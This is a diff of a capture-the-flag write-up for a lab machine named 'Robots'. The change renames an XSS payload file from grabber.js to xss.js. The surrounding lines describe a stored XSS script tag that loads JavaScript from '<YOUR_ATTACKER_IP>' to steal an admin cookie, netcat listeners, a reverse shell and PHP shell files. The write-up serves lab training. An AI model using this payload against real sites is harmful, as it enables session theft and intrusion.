@@ -216,11 +216,11 @@ Our approach to compromising the "Robots" machine followed a structured penetrat
 ### Tools & Commands Used:
 
 
-* **Python's `http.server`:** To host malicious JavaScript (`grabber.js`) and PHP files (`shell.php`, `test.php`).
+* **Python's `http.server`:** To host malicious JavaScript (`xss.js`) and PHP files (`shell.php`, `test.php`).
 
 * **Netcat (`nc`):** To set up listeners for both the stolen XSS data and the incoming reverse shell connection.
 
-* **Text Editor:** For creating `grabber.js`, `test.php`, and `shell.php`.
+* **Text Editor:** For creating `xss.js`, `test.php`, and `shell.php`.
 
 * **Browser Cookie Editor:** To inject the stolen admin cookie into the attacker's browser.
 
@@ -261,11 +261,11 @@ Our approach to compromising the "Robots" machine followed a structured penetrat
         ```
 
 
-2.  **Create `grabber.js` (XSS Payload):**
+2.  **Create `xss.js` (XSS Payload):**
 
-    * **Action:** Create `grabber.js` in your `~/robots_payloads/` directory.
+    * **Action:** Create `xss.js` in your `~/robots_payloads/` directory.
 
-    * **Code for `grabber.js`:**
+    * **Code for `xss.js`:**
 
         ```javascript
 
@@ -296,11 +296,11 @@ Our approach to compromising the "Robots" machine followed a structured penetrat
 
         ```html
 
-        <script src="http://<YOUR_ATTACKER_IP>/grabber.js"></script>
+        <script src="http://<YOUR_ATTACKER_IP>/xss.js"></script>
 
         ```
 
-    * **Reasoning:** When the admin views this registered username (as implied by "Admin monitors new users"), their browser executes the script, loading `grabber.js` from our Python web server.
+    * **Reasoning:** When the admin views this registered username (as implied by "Admin monitors new users"), their browser executes the script, loading `xss.js` from our Python web server.
 
 
 4.  **Capture and Decode Admin Cookie:**
